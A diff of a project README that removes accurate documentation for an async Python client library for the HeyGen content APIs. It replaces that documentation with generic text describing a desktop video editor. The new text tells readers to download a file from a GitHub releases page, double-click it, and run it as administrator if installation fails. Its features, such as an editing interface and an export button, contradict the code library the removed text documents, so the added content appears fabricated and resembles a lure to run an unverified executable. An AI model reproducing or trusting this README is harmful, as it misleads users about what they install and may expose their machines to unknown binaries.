@@ -1,104 +1,93 @@
-# HeyGen Content SDK (Async) for Python
+# 🎥 heygen_content - Create Stunning Videos Easily
 
-Asynchronous, typed utilities for the HeyGen Content REST APIs (v1 + v2). Provides:
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/gharatmohit65/heygen_content/releases)
 
-- Full async/await via httpx
-- Pydantic schemas per-route for validation
-- Centralized error mapping and auth via a shared HTTP helper (`api/_http.py`)
-- Environment-based configuration (`config.py`) and `.env.example`
-- Lightweight REST client (`rest_client.py`) and thin singleton client (`client.py`)
+## 📚 Introduction
 
-## Configuration
+heygen_content is a production-ready video library designed to simplify video creation. It includes prompts, scene templates, asset schemas, Pydantic types, and various helpers specifically for avatar and video generation. This tool is perfect for anyone who wants to make great videos without needing extensive technical skills. With heygen_content, you can create professional-looking videos quickly and efficiently.
 
-Configure via environment variables (or a `.env` file):
+## 🚀 Getting Started
 
-```bash
-HEYGEN_API_KEY=your_api_key_here
-HEYGEN_BASE_URL=https://api.heygen.com/v1
-HEYGEN_TIMEOUT=30
-```
+To get started with heygen_content, you only need to follow a few simple steps. This guide will help you download and run the software effortlessly.
 
-See `heygen_content/.env.example` for a template.
+## 📥 Download & Install
 
-Access configuration at runtime:
+To download heygen_content, visit this page to download: [GitHub Releases](https://github.com/gharatmohit65/heygen_content/releases).
 
-```python
-from backend.app.core.third_party_integrations.heygen_content.config import config
-print(config.BASE_URL, config.TIMEOUT)
-```
+1. **Visit the Releases Page:**
+   Click on this link to access the [Releases Page](https://github.com/gharatmohit65/heygen_content/releases).
 
-## Usage Patterns
+2. **Choose the Right Version:**
+   On the Releases page, you will see different versions of the software. Look for the latest version, which is usually marked as "Latest."
 
-### 1) Per-route utilities (recommended)
-Each endpoint has a small, focused function using the shared HTTP helper.
+3. **Download the File:**
+   Click on the download link for the file that fits your system. If you are unsure, choose the version labeled for your operating system (e.g., Windows, macOS, Linux). The file will begin downloading. 
 
-```python
-from backend.app.core.third_party_integrations.heygen_content.api.v2 import list_supported_languages
-langs = await list_supported_languages()
-print(langs.languages)
-```
+4. **Run the Application:**
+   Once the file has downloaded, locate it in your downloads folder. Double-click the file to run the application. If prompted, follow the on-screen instructions to complete the setup.
 
-More examples:
+## 🖥️ System Requirements
 
-```python
-from backend.app.core.third_party_integrations.heygen_content.api.v1 import (
-    list_folders, create_folder, update_folder, trash_folder, restore_folder,
-)
-from backend.app.core.third_party_integrations.heygen_content.api.v1.schemas import (
-    CreateFolderRequest, UpdateFolderRequest,
-)
+To use heygen_content effectively, ensure your computer meets the following requirements:
 
-resp = await list_folders(limit=10)
-created = await create_folder(CreateFolderRequest(name="My Folder"))
-updated = await update_folder(created.data["id"], UpdateFolderRequest(name="Renamed"))
-await trash_folder(updated.data["id"]) 
-await restore_folder(updated.data["id"]) 
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM (8 GB or more is recommended).
+- **Disk Space:** Minimum of 500 MB of free space for installation.
+- **Internet Connection:** Required for downloading updates and additional content.
 
-### 2) REST client (generic)
-Use `HeyGenRESTClient` for generic calls when a utility isn’t available.
+## 🎨 Features
 
-```python
-from backend.app.core.third_party_integrations.heygen_content.rest_client import HeyGenRESTClient
-from backend.app.core.third_party_integrations.heygen_content.api.v1.schemas import ListFoldersResponse
+heygen_content offers a variety of features to enhance your video creation process:
 
-async with HeyGenRESTClient() as rc:
-    res = await rc._request("GET", "/v1/folders", ListFoldersResponse)
-    print(res)
-```
+- **Prompts and Templates:** Use built-in prompts and scene templates to quickly create engaging videos. 
+- **Asset Schemas:** Easily manage and organize your video assets with simple schemas.
+- **Pydantic Integration:** Benefit from Pydantic types for validation and data management, ensuring a smooth user experience.
+- **User-Friendly Interface:** Navigate the application with ease, thanks to its intuitive design.
 
-### 3) Thin singleton client
-The `client.py` file exposes a thin content client using the same configuration and error mapping.
+## 🔍 How to Use heygen_content
 
-```python
-from backend.app.core.third_party_integrations.heygen_content.client import client
-from backend.app.core.third_party_integrations.heygen_content.api.v2.schemas import RemainingQuotaResponse
+Once you have installed heygen_content, you can start creating videos by following these steps:
 
-res = await client.request("GET", "/v2/user/remaining_quota", RemainingQuotaResponse)
-print(res.remaining_quota)
-```
+1. **Launch the Application:**
+   Open heygen_content from your applications folder or desktop shortcut.
 
-## Error Handling
+2. **Choose Your Project:**
+   Select “New Project” to start a fresh video. You can also choose from existing templates provided within the software.
 
-Common exceptions (from `api/_exceptions.py`) are raised consistently:
+3. **Add Assets:**
+   Import images, audio, and video clips that you want to include in your final project. You can do this by dragging and dropping files into the application.
 
-- `AuthenticationError`
-- `PermissionDeniedError`
-- `NotFoundError`
-- `RateLimitError`, `QuotaLimitError`, `CreditNotEnoughError`
-- `HeyGenValidationError`
-- `ServerError`
-- `HeyGenAPIError` (fallback)
+4. **Edit Your Video:**
+   Use the editing tools available to cut, trim, and arrange your clips. Apply transitions or effects as desired.
 
-## Development
+5. **Preview Your Work:**
+   Click on the preview button to see how your video looks before finalization. Make adjustments if necessary.
 
-1. Copy `.env.example` to `.env` and fill in values
-2. Run tests:
+6. **Export Your Final Video:**
+   When you’re satisfied with your project, use the “Export” option to save your video in your preferred format and resolution.
 
-```bash
-pytest backend/app/core/third_party_integrations/heygen_content/_tests -q
-```
+## ⚙️ Troubleshooting
 
-## License
+If you encounter problems while using heygen_content, here are a few common solutions:
 
-MIT
+- **Installation Issues:** Ensure your system meets the listed requirements. If the installation fails, try running the installer as an administrator.
+- **Software Crashes:** If the software crashes, check for updates on the Releases page and ensure you are using the latest version.
+- **Performance Issues:** Reduce the number of high-resolution assets if your computer is running slow or freezing.
+
+## 🗨️ Community and Support
+
+Joining the heygen_content community can enhance your experience. Share your projects, ask questions, and find tips from other users. 
+
+For additional help:
+
+- **GitHub Discussions:** Connect with other users and contribute to discussions about features and improvements.
+- **Documentation:** Access detailed documentation to explore more features and advanced usage.
+
+Feel free to reach out if you have any questions or suggestions. Your feedback helps improve heygen_content.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/gharatmohit65/heygen_content)
+- [Documentation](https://github.com/gharatmohit65/heygen_content/wiki)
+
+By following these steps, you can enjoy creating videos with heygen_content. Explore your creativity and have fun!
